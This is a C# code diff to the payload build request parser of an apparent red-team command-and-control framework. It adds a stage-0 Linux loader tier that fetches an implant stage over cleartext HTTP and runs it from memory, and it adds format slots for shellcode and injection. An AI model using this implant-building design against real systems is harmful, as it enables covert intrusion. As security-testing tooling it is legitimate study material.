@@ -45,6 +45,7 @@ internal static class PayloadBuildRequestParser
         OperatorId requestedBy,
         IListenerRegistry listeners,
         IImplantCertificateAuthority ca,
+        Rod.Audit.IPayloadStore payloads,
         CancellationToken cancellationToken)
     {
         // Language and class come in as strings and parse to the enums; anything
@@ -62,15 +63,25 @@ internal static class PayloadBuildRequestParser
                 "The stager class is retired; deliver the payload through the launcher one-liners (launchers render them per payload).");
         if (!TryParseClass(body.Class, out var @class))
             return (null, "Implant class is not recognized.");
-        // The dll bundle was the .NET in-memory shape; with the .NET implant
-        // retired there is no producer -- the Rust implant is native in every
-        // format, and its 'aot' spelling is the one the memfd one-liner
-        // family keys on.
+        // The kind names the delivery tier: the implant (the default, the
+        // full product) or the stage-0 loader that fetches and runs a stage
+        // from memory. The loader gates live below, after the endpoint
+        // resolves -- they read the front the bake dials.
+        if (!PayloadKinds.TryParse(body.Kind, out var kind))
+            return (null, "Kind must be 'implant' (the default) or 'loader'.");
+        // The format axis carries the deployment shapes (architecture.md
+        // Sec 6). The in-tree Rust unit produces the executable spellings
+        // only: they are synonyms over the same native binary, and the
+        // loader crate beside it emits the loader tier. The shared-library
+        // and shellcode shapes are contract slots -- the parser names them
+        // so a request can be refused with the delivery story, not a bare
+        // parse error, until the toolchain that produces them lands.
         if (!ArtifactFormats.TryParse(body.Format, out var format))
-            return (null, "Format must be one of 'exe' (the default), 'exe-trimmed', or 'aot'.");
-        if (format == ArtifactFormat.Dll)
+            return (null, "Format must be one of 'exe' (the default), 'exe-trimmed', 'aot', 'dll', 'so', or 'shellcode'.");
+        if (format is ArtifactFormat.Dll or ArtifactFormat.SharedObject or ArtifactFormat.Shellcode)
             return (null,
-                "The dll format is retired with the .NET implant; every Rust artifact is a native executable -- use 'exe' or 'aot'.");
+                $"The '{ArtifactFormats.Name(format)}' format is a contract slot the in-tree Rust unit does not produce yet "
+                + "-- it names the loader and injection deliveries; build 'exe' or 'aot' for now.");
         // The endpoint list is what the baked implant dials, so a malformed
         // entry must not reach the build: it would not fail there -- it would
         // produce a payload that phones nowhere, the silent kind of failure
@@ -189,6 +200,63 @@ internal static class PayloadBuildRequestParser
         // baked; unset means open-ended (no fuse).
         if (body.KillDate is { } pinned && pinned <= DateTimeOffset.UtcNow)
             return (null, "KillDate must be in the future; leave it empty for an open-ended artifact.");
+
+        // The loader tier's own gates. The stage-0 loader is a no_std dialer
+        // by design (architecture.md Sec 6, staging): it speaks plain HTTP
+        // to a literal IPv4, carries no TLS and no resolver, and runs on the
+        // two Linux arches its crate compiles. Every refusal names the shape
+        // it wants rather than failing inside cargo with less to act on.
+        if (kind == PayloadKind.Loader)
+        {
+            if (language != Language.Rust)
+                return (null, "The loader tier is the in-tree Rust unit's artifact; set language to Rust or leave it empty.");
+            if (format is not (ArtifactFormat.SingleFileExe or ArtifactFormat.TrimmedExe or ArtifactFormat.NativeAot))
+                return (null, "The loader is a native executable; build it with the default 'exe' format.");
+            var os = (body.TargetOs ?? "linux").Trim().ToLowerInvariant();
+            var arch = (body.TargetArch ?? "amd64").Trim().ToLowerInvariant();
+            if (os != "linux")
+                return (null,
+                    "The stage-0 loader is a Linux memfd shape; a Windows target delivers through the launcher one-liners.");
+            if (arch is not ("amd64" or "x64" or "x86_64" or "arm64" or "aarch64"))
+                return (null, "The stage-0 loader compiles for linux amd64 and arm64 only.");
+            // The dial: cleartext HTTP on a literal IPv4. A hostname needs a
+            // resolver and an https front needs TLS -- both implant-tier
+            // machinery this tier refuses to carry. The stage rides sealed
+            // under the per-build key, the same posture as the cleartext
+            // contact, so the plain transport costs nothing but leaves the
+            // front's spelling narrow on purpose.
+            if (!TryLiteralIpv4Http(endpoint.Value, out var loaderHost, out var loaderPort))
+                return (null,
+                    "The stage-0 loader dials a literal IPv4 over cleartext http (it carries no TLS and no resolver) -- "
+                    + "point the build at an http listener whose public endpoint is an IPv4 address.");
+            // The stage reference: this engagement's own stored payload, and
+            // not another loader -- the loader delivers the implant tier,
+            // and a chain of dialers is a footprint, not a capability.
+            if (body.StagePayloadId is not { } stageText)
+                return (null, "A loader build names the stored payload it delivers (stagePayloadId).");
+            if (!Guid.TryParse(stageText, out var stageValue))
+                return (null, "StagePayloadId is not a valid identifier.");
+            var stage = await payloads.FindAsync(stageValue, engagementId.Value, cancellationToken);
+            if (stage is null)
+                return (null, "StagePayloadId does not name a payload in this engagement.");
+            if (stage.StagePayloadId is not null)
+                return (null, "StagePayloadId names a loader; the loader delivers the implant tier, not another loader.");
+            return (new BuildRequest(
+                engagementId,
+                requestedBy,
+                language,
+                @class,
+                new TargetProfile(body.TargetOs ?? "linux", body.TargetArch ?? "amd64"),
+                BuildTransport(body, endpoint.Value!, beacon.Value, ExportCaPem(ca),
+                    trust == "public" ? TlsTrust.Public : TlsTrust.Pinned),
+                ParseDuration(body.SleepSeconds, DefaultSleep),
+                ParseDuration(body.JitterSeconds, DefaultJitter),
+                body.KillDate,
+                mode,
+                Format: format,
+                Kind: kind,
+                StagePayloadId: stageValue), null);
+        }
 
         // The loader class retired with the .NET trees, so no build carries a
         // fetched-payload reference anymore; a request naming one is a leftover from
@@ -532,6 +600,30 @@ internal static class PayloadBuildRequestParser
         => seconds is { } value && value >= 0
             ? TimeSpan.FromSeconds(Math.Min(value, MaxDurationSeconds))
             : fallback;
+
+
+    // The loader's dial shape: a cleartext http URL whose authority is a
+    // literal IPv4 with an optional port (80 implied). The stage-0 loader
+    // bakes the four address bytes and the port as constants -- no resolver,
+    // no TLS -- so anything else (a hostname, https, another family) is a
+    // front this tier cannot dial, refused here with the shape named.
+    private static bool TryLiteralIpv4Http(string? endpoint, out byte[]? address, out int port)
+    {
+        address = null;
+        port = 80;
+        var trimmed = endpoint?.Trim();
+        if (trimmed is null || !trimmed.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
+            return false;
+        var authority = trimmed[7..].Split('/')[0];
+        var colon = authority.LastIndexOf(':');
+        var host = colon >= 0 ? authority[..colon] : authority;
+        if (colon >= 0 && (!int.TryParse(authority[(colon + 1)..], out port) || port is < 1 or > 65535))
+            return false;
+        if (!System.Net.IPAddress.TryParse(host, out var parsed) || parsed.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
+            return false;
+        address = parsed.GetAddressBytes();
+        return true;
+    }
 
     // An endpoint the implant can dial: an absolute http(s) URL, or the
     // socket or DNS family's dial (architecture.md Sec 8 -- a tcp-, dns-,
